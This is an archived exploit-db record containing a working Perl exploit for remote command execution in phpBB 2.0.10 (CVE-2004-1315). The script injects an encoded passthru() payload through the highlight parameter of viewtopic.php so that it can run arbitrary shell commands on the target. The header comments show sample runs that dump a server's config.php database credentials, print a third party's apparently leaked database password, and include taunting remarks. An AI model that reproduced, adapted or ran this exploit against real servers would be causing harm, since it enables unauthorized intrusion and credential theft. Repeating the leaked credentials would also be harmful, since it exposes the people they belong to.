{
  "id": "647",
  "title": "phpBB 2.0.10 - Remote Command Execution",
  "cve": "CVE-2004-1315",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n\r\nuse IO::Socket;\r\n\r\n##                     @@@@@@@   @@@  @@@   @@@@@@  @@@  @@@\r\n##                     @@!  @@@  @@!  @@@  !@@      @@!  @@@\r\n##                     @!@!!@!   @!@  !@!   !@@!!   @!@!@!@!\r\n##                     !!: :!!   !!:  !!!      !:!  !!:  !!!\r\n##                      :   : :   :.:: :   ::.: :    :   : :\r\n##\r\n## phpBB <= 2.0.10 remote commands exec exploit\r\n## based on http://securityfocus.com/archive/1/380993/2004-11-07/2004-11-13/0\r\n## succesfully tested on: 2.0.6 , 2.0.8 , 2.0.9 , 2.0.10\r\n## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n## example...\r\n## he-he-he ... read http://www.phpbb.com/phpBB/viewtopic.php?t=239819\r\n## The third issue, search highlighting, has been checked by us several times and we can do \r\n## nothing with it at all. Again, that particular group admit likewise. In a future release \r\n## of 2.0.x we will eliminate the problem once and for all, but as noted it cannot (to our \r\n## knowledge and as noted, testing) be taken advantage of and thus is not considered by us to \r\n## be cause for an immediate release.\r\n## heh...\r\n##\r\n## r57phpbb2010.pl www.phpbb.com /phpBB/ 239819 \"ls -la\"\r\n## *** CMD: [ ls -la ]\r\n## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n##   total 507\r\n##   drwxr-xr-x   12 dhn      phpbb         896 Oct 13 18:23 .\r\n##   drwxrwxr-x   19 root     phpbb        1112 Nov 12 15:08 ..\r\n##   drwxr-xr-x    2 dhn      phpbb         152 Oct 13 18:23 CVS\r\n##   drwxr-xr-x    3 dhn      phpbb         944 Jul 19 15:17 admin\r\n##   drwxrwxrwx    5 dhn      phpbb         160 Aug 14 21:19 cache\r\n##   -rw-r--r--    1 dhn      phpbb       44413 Mar 11  2004 catdb.php\r\n##   -rw-r--r--    1 dhn      phpbb        5798 Jul 19 15:17 common.php\r\n##   -rw-r--r--    1 root     root          264 Jul  2 08:05 config.php\r\n##   drwxr-xr-x    3 dhn      phpbb         136 Jun 24 06:40 db\r\n##   drwxr-xr-x    3 dhn      phpbb         320 Jul 19 15:17 docs\r\n##   -rw-r--r--    1 dhn      phpbb         814 Oct 30  2003 extension.inc\r\n##   -rw-r--r--    1 dhn      phpbb        3646 Jul 10 04:21 faq.php\r\n##   drwxr-xr-x    2 dhn      phpbb          96 Aug 12 14:59 files\r\n##   -rw-r--r--    1 dhn      phpbb       45642 Jul 12 12:42 groupcp.php\r\n##   drwxr-xr-x    7 dhn      phpbb         240 Aug 12 16:22 images\r\n##   drwxr-xr-x    3 dhn      phpbb        1048 Jul 19 15:17 includes\r\n##   -rw-r--r--    1 dhn      phpbb       14518 Jul 10 04:21 index.php\r\n##   drwxr-xr-x   60 dhn      phpbb        2008 Sep 27 01:54 language\r\n##   -rw-r--r--    1 dhn      phpbb        7481 Jul 19 15:17 login.php\r\n##   -rw-r--r--    1 dhn      phpbb       12321 Mar  4  2004 memberlist.php\r\n##   -rw-r--r--    1 dhn      phpbb       37639 Jul 10 04:21 modcp.php\r\n##   -rw-r--r--    1 dhn      phpbb       45945 Mar 24  2004 mods_manager.php\r\n##   -rw-r--r--    1 dhn      phpbb       34447 Jul 10 04:21 posting.php\r\n##   -rw-r--r--    1 dhn      phpbb       72580 Jul 10 04:21 privmsg.php\r\n##   -rw-r--r--    1 dhn      phpbb        4190 Jul 12 12:42 profile.php\r\n##   -rw-r--r--    1 dhn      phpbb       16276 Oct 13 18:23 rules.php\r\n##   -rw-r--r--    1 dhn      phpbb       42694 Jul 19 15:17 search.php\r\n##   drwxr-xr-x    4 dhn      phpbb         136 Jun 24 06:41 templates\r\n##   -rw-r--r--    1 dhn      phpbb       23151 Mar 13  2004 viewforum.php\r\n##   -rw-r--r--    1 dhn      phpbb        7237 Jul 10 04:21 viewonline.php\r\n##   -rw-r--r--    1 dhn      phpbb       45151 Jul 10 04:21 viewtopic.php\r\n## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n## r57phpbb2010.pl www.phpbb.com /phpBB/ 239819 \"cat config.php\"\r\n## *** CMD: [ cat config.php ]\r\n## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n##   $dbms = \"mysql\";\r\n##   $dbhost = \"localhost\";\r\n##   $dbname = \"phpbb\";\r\n##   $dbuser = \"phpbb\";\r\n##   $dbpasswd = \"phpBB_R0cKs\";\r\n##   $table_prefix = \"phpbb_\";\r\n## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n## rocksss.... \r\n##\r\n## P.S. this code public after phpbb.com was defaced by really stupid man with nickname tristam...\r\n## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n## fucking lamaz...\r\n##\r\n## ccteam.ru\r\n## $dbname   = \"ccteam_phpbb2\";\r\n## $dbuser   = \"ccteam_userphpbb\";\r\n## $dbpasswd = \"XCbRsoy1\";\r\n##\r\n## eat this dude...\r\n## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nif (@ARGV < 4)\r\n {\r\n print q(############################################################\r\n     phpBB <=2.0.10 remote command execution exploit\r\n        by RusH security team // www.rst.void.ru\r\n############################################################\r\n usage:\r\n r57phpbb2010.pl [URL] [DIR] [NUM] [CMD]\r\n params:\r\n  [URL] - server url e.g. www.phpbb.com\r\n  [DIR] - directory where phpBB installed e.g. /phpBB/ or /\r\n  [NUM] - number of existing topic\r\n  [CMD] - command for execute e.g. ls or \"ls -la\" \r\n############################################################\r\n );   \r\n exit;\r\n }\r\n\r\n$serv  = $ARGV[0];\r\n$dir   = $ARGV[1];\r\n$topic = $ARGV[2];\r\n$cmd   = $ARGV[3];\r\n\r\n$serv =~ s/(http:\\/\\/)//eg;\r\nprint \"*** CMD: [ $cmd ]\\r\\n\";\r\nprint \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\n\r\n$cmd=~ s/(.*);$/$1/eg;\r\n$cmd=~ s/(.)/\"%\".uc(sprintf(\"%2.2x\",ord($1)))/eg;\r\n$topic=~ s/(.)/\"%\".uc(sprintf(\"%2.2x\",ord($1)))/eg;\r\n\r\n$path  = $dir;\r\n$path .= 'viewtopic.php?t=';\r\n$path .= $topic;\r\n$path .= '&rush=%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20';\r\n$path .= $cmd;\r\n$path .= '%3B%20%65%63%68%6F%20%5F%45%4E%44%5F';\r\n$path .= '&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5F%47%45%54%5F%56%41%52%53%5B%72%75%73%68%5D%29.%2527';\r\n\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$serv\", PeerPort => \"80\") || die \"[-] CONNECT FAILED\\r\\n\";\r\n\r\nprint $socket \"GET $path HTTP/1.1\\n\";\r\nprint $socket \"Host: $serv\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\n\r\n$on = 0;\r\n\r\nwhile ($answer = <$socket>)\r\n{\r\nif ($answer =~ /^_END_/) { print \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\"; exit(); }\r\nif ($on == 1) { print \"  $answer\"; }\r\nif ($answer =~ /^_START_/) { $on = 1; }\r\n}\r\n\r\nprint \"[-] EXPLOIT FAILED\\r\\n\";\r\nprint \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\n\r\n### EOF ###\r\n\r\n# milw0rm.com [2004-11-22]",
  "url": "https://www.exploit-db.com/exploits/647"
}